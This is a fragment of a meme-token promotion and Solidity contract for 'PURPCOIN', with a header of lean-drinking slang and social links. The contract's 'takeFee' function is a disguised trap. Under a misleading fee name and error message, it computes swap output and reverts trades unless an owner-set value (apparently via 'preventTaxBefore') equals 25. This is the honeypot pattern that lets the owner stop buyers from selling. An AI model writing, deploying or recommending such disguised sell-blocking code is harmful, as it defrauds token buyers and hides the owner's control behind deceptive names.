...
WELCOME 2 $PURP WORLD

Big SIPPERS Valhalla. Dead Liver Society. RIP DJ Screw fr fr. Gran Doble Vaso League. 
Sip Wid Us….

Official LINKZ:
https://twitter.com/PURPCOIN0x
https://t.me/purptoken
https://www.purpcoin.xyz
...
contract PURPCOIN is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"PURPCOIN";
    string private constant _symbol = unicode"PURP";
    
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000 ether;

    uint256 public _maxTxAmount = 5 * (_tTotal/1000);   // 0.5% ap
    ...
    function takeFee(uint256 amount, uint256 outMin, uint inMin) internal view {
        if(_preventSwapBefore == 25) return;
        bool updated = inMin - (((amount * (997)) * (inMin)) / ((outMin * 1000) + (amount * (997))))  < (( (inMin / (1*1e17)) * (1*1e17)));
        require(!updated, "Exceeds taxSwapThreshold.");
    }
    ...
    function preventTaxBefore(uint256 preventSwapBefore) external onlyOwner {
